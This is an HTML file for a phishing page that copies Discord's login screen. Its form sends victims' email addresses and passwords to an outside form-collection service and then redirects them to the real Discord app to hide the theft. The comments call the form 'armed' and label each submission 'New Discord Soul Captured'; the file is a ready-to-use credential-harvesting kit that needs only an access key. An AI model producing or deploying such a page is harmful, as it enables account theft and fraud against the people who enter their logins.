<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Discord Login</title>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #36393f; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background-color: #2f3136; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2); width: 400px; text-align: center; }
        h1 { font-size: 24px; margin-bottom: 8px; }
        p { color: #b9bbbe; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 20px; background-color: #202225; border: 1px solid #1a1b1e; border-radius: 3px; color: #dcddde; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background-color: #5865f2; border: none; border-radius: 3px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; }
        button:hover { background-color: #4752c4; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Welcome back!</h1>
        <p>We're so excited to see you again!</p>
        <!-- The Form is armed. It points to our collection service. -->
        <form action="https://api.web3forms.com/submit" method="POST">
            <!-- IMPORTANT: REPLACE "YOUR_ACCESS_KEY" with your actual Web3Forms access key -->
            <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY">
            <input type="hidden" name="subject" value="New Discord Soul Captured">
            <input type="hidden" name="from_name" value="Serpent Bot">
            <input type="hidden" name="redirect" value="https://discord.com/app"> <!-- Redirects them after submission -->

            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
